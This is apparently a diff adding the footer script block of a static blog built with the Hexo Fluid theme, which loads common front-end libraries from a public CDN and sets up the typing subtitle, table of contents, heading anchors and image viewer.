+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
